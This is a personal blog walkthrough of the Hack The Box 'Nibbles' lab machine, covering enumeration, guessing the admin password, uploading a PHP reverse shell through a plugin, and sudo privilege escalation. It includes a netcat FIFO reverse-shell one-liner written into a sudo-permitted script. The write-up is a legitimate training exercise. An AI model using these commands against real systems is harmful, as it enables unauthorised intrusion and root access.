<!doctype html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/images/favicon.png" />

<title>[HTB] Nibbles&nbsp;|&nbsp;Wook&#39;s blog</title>
<meta
  name="title"
  content="[HTB] Nibbles"
/>
<meta
  name="description"
  content="enumeration using nmap scan from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80. Navigated to the target address on firefox but the website didn&rsquo;t have any juicy info except the plain text saying Hello world!. right clicked on the web page and viewed the source code without any expectation but there was this interesting comment."
/>
<meta
  name="keywords"
  content="Hack The Box,"
/>

  <meta name="author" content="Wook Lee" />




<meta property="og:url" content="http://localhost:1313/htb-nibbles/">
  <meta property="og:site_name" content="Wook&#39;s blog">
  <meta property="og:title" content="[HTB] Nibbles">
  <meta property="og:description" content="enumeration using nmap scan from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80. Navigated to the target address on firefox but the website didn’t have any juicy info except the plain text saying Hello world!. right clicked on the web page and viewed the source code without any expectation but there was this interesting comment.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2024-08-08T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-08T00:00:00+00:00">
    <meta property="article:tag" content="Hack The Box">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="[HTB] Nibbles">
  <meta name="twitter:description" content="enumeration using nmap scan from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80. Navigated to the target address on firefox but the website didn’t have any juicy info except the plain text saying Hello world!. right clicked on the web page and viewed the source code without any expectation but there was this interesting comment.">





  <meta itemprop="name" content="[HTB] Nibbles">
  <meta itemprop="description" content="enumeration using nmap scan from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80. Navigated to the target address on firefox but the website didn’t have any juicy info except the plain text saying Hello world!. right clicked on the web page and viewed the source code without any expectation but there was this interesting comment.">
  <meta itemprop="datePublished" content="2024-08-08T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-08-08T00:00:00+00:00">
  <meta itemprop="wordCount" content="527">
  <meta itemprop="keywords" content="Hack The Box">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/blog/"
    
    >Blog</a
  >

  <a
    href="/photos/"
    
    >Photos</a
  >


  <a href="/index.xml">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
      
      <path
        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
      />
    </svg>
    RSS
  </a>

</nav>

<h1>[HTB] Nibbles</h1>


    </header>
    <main>
      
  
    
      
      <p>
        <i>
          <time datetime="2024-08-08" pubdate>
            2024-08-08
          </time>
        </i>
      </p>
    
  
  
  <content>
    <h4 id="enumeration-using-nmap-scan">enumeration using nmap scan</h4>
<p>from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80.
<img src="image-29.png#center" alt="alt text"></p>
<br>
<p>Navigated to the target address on firefox but the website didn&rsquo;t have any juicy info except the plain text saying <strong><em>Hello world!</em></strong>.
<img src="image-30.png#center" alt="alt text"></p>
<br>
<p>right clicked on the web page and <strong><em>viewed the source code</em></strong> without any expectation but there was this interesting comment.
<img src="image-31.png#center" alt="alt text"></p>
<br>
<p>navigated to the <strong><em>/nibbleblog</em></strong> as the comment hinted
<img src="image-32.png#center" alt="alt text"></p>
<br>
<h4 id="more-information-gathering-with-_gobuster_">more information gathering with <strong><em>gobuster</em></strong></h4>
<p>while on the <strong><em>/nibbleblog</em></strong> web page, I could not find more useful info so I decided to run a <strong><em>gobuster</em></strong> on the website to gather more information.
<img src="image-33.png#center" alt="alt text"></p>
<br>
<p>The gobuster output showed many directories but the results were not satisfying. I knew there had to be more. So I ran another <strong><em>gobuster</em></strong> scan but this time I added the <strong>-x</strong> option to search for specific file extensions.</p>
<p>The <strong><em>/admin.php</em></strong> was the first result that caught my eye.</p>
<p><img src="image-34.png#center" alt="alt text"></p>
<br>
<p><strong><em>/nibbleblog/admin.php</em></strong></p>
<p><img src="image-35.png#center" alt="alt text"></p>
<br>
<p>I didn&rsquo;t have anything for the admin credentials until I found this <strong><em>user.xml</em></strong> file that&rsquo;s located in the following path:
<strong><em>/nibbleblog/content/private/users.xml</em></strong>
<img src="image-36.png#center" alt="alt text"></p>
<br>
<p>The title of the nibbleblog was <strong><em>nibbles</em></strong> so why not try that for the password? and it turned out that it was the password. I was skeptical of doing the guesswork for the password but later I refered to other people&rsquo;s write ups but all of them also did some guessworks to figure out the password. I guess it&rsquo;s an important part of the pentesting.</p>
<p><img src="image-37.png#center" alt="alt text"></p>
<br>
<p>a screenshot of the admin dashboard page
<img src="image-38.png#center" alt="alt text"></p>
<br>
<p>Under the <strong>/plugins</strong> directory, there was this <strong><em>my image</em></strong> page where I could upload a file to the server and I definitely knew I could use this for uploading a reverse shell payload as an exploitation.</p>
<p><img src="image-39.png#center" alt="alt text"></p>
<br>
<p>For the reverse shell payload, I downloaded the popular <strong><em>pentestmonkey</em></strong>&rsquo;s php-reverse-shell.
<img src="image-40.png#center" alt="alt text"></p>
<br>
<p><img src="image-41.png#center" alt="alt text"></p>
<br>
<p>After uploading the payload file I had to manually navigate to the following path to run it on the server.</p>
<p><strong><em>/nibbleblog/content/private/plugins/my_image</em></strong>
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p><strong><em>netcat listener</em></strong> successfully captured the reverse shell.
<img src="image-2.png#center" alt="alt text"></p>
<br>
<p>got the user flag!</p>
<p>oh I almost forgot. As you could notice from the screenshot below, I upgraded the shell to the <strong><em>fully interactive TTY Shell</em></strong>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#6c7086;font-style:italic">#reverse shell</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>python3 -c <span style="color:#a6e3a1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ctrl + z <span style="color:#6c7086;font-style:italic"># background</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic">#kali</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>stty raw -echo; <span style="color:#89dceb">fg</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>reset
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#6c7086;font-style:italic">#reverse shell</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb">export</span> <span style="color:#f5e0dc">SHELL</span><span style="color:#89dceb;font-weight:bold">=</span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb">export</span> <span style="color:#f5e0dc">TERM</span><span style="color:#89dceb;font-weight:bold">=</span>xterm-256color</span></span></code></pre></div>
<hr>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p><strong><em>privilege escalation</em></strong></p>
<p>With the reverse shell, the current user, <strong>nibbler</strong> was not able to access the root directory. So I had to figure a way for privilege escalation. I ran the <code>sudo -l</code> command to list the commands I can actually run with the <strong>sudo</strong> and I could run the following</p>
<p><code>/home/nibbler/personal/stuff/monitor.sh</code></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<p>This is the part where I needed some help. I couldn&rsquo;t figure out what it took me to write inside the <strong>monitor.sh</strong> file for privilege escalation so I refered to one of the walkthroughs online.</p>
<p><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.15 1235 &gt;/tmp/f' &gt; /home/nibbler/personal/stuff/monitor.sh</code></p>
<br>
<p>After modifying the content inside the file, I pop opened another netcat listener with another port, 1235 because the port 1234 was already listening for the original reverse shell.</p>
<p><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></p>
<br>
<p><strong>id</strong> command returned that I&rsquo;m the root user
<img src="image-5.png#center" alt="alt text"></p>
<br>
<p>successfully got the root flag
<img src="image-6.png#center" alt="alt text"></p>
<br>
<p><img src="image-7.png#center" alt="alt text"></p>

  </content>
  
  <p>
    
    <a href="/blog/hack-the-box/">#Hack The Box</a>&nbsp;&nbsp;
    
  </p>

    </main>
    <footer>
      

  <span>
    
    Made with
    <a href="https://github.com/maolonglong/hugo-simple/">Hugo ʕ•ᴥ•ʔ Simple</a>
  </span>


    </footer>

    
</body>
</html>
